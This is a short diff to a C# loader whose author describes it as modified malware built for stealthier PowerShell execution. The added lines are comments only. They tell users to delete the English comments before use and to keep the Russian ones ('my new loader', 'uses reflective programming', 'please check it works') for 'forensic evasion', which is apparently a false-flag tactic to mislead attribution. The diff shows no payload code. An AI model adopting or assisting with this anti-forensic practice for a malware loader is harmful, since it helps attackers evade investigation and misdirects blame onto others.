@@ -1,5 +1,11 @@
 //A Project by 5HR3K
 // I modified code from another piece of malware as I saw a possibility to be more stealthy in the Powershell Script Execution.
+//Please remove English comments before using. Other comments can be used for forensic evasion.
+
+
+//Мой новый погрузчик
+//Написано на C#
+//Использует принципы рефлексивного программирования
 
 using System;
 using System.Diagnostics;
@@ -29,3 +35,5 @@ internal class Program
 		}
 	}
 }
+
+//Пожалуйста, проверьте, что это работает.
